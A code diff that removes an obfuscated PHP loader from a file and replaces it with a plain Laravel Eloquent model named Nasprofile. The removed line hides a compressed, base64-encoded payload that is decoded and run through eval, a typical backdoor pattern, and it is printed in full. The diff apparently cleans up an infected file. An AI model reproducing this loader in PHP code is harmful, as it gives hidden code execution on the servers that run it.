@@ -1,1 +1,26 @@
-<?php $_='1d8fc22b';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqVU02TmkAQvedXcNgqtJIDoKyhLA/CyihGjLgywMVyZlxAGKRC5OvXZwRdMTllqhqa6df9Xnc1HNeel/3jTPghkZWRcCT8+KW9SH+Fye8PfvyF6+AnHO+ISo6gnbibyYTnHuF7vQlzeUxtgTjGZaGpMaF6ttSsD0f8nq6LaxL3XHTPcU0SOmTH1+GeHPGZHPnxPxLfNmdTo3LA2GsM9JO3VVU8V/E7VCIPlvW6EJZvm1TE0s7fwjIjUEwR1QXPLmeuYwUu1Wvm6wgoJYH2heglcKEpoIGReo6Jt0CvLaqfCFCq43tmaoldMw4DgVJEML6wGrEzswIC9NB1TObbGRroogdlwZmJuQfs7KbhhFgtXKlrhiswVegBlvEC2EMC7Is3X/mt5oJxMJ5w6rNBtbr/1uALy4XG4nO1QgMrdpl52jTyaJwxjhCBnf9zqyI2G7/BNUZOSJIZJ05+TG/5rSWuo6bOQM1xsnnEdGHUzLbVURBoZAe48r3EvjC+FElDn82xXmrRHTN64psbMZnbFQqnEQFBiivhq0vZbCQ5waKVL2dygOvzqyuVAR6s0uuM2jyh25/o0jJ1K5USKLP+4xyF6q0PIrKFiv6Hn0hBjOnubEhmjqiXehXOFhpWjKrwV1r0mf+xEZZX6+x5Z5Wbd+/21W/+jM5df3xHNpc9/vrkv33Cn5f8VqfX3el+f/wHnvIazw=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Nasprofile extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'config',
+        'api_port',
+    ];
+
+    public function nas()
+    {
+        return $this->belongsTo(Nas::class);
+    }
+
+    public function configured()
+    {
+        return $this->where('config', '=', 0);
+    }
+}
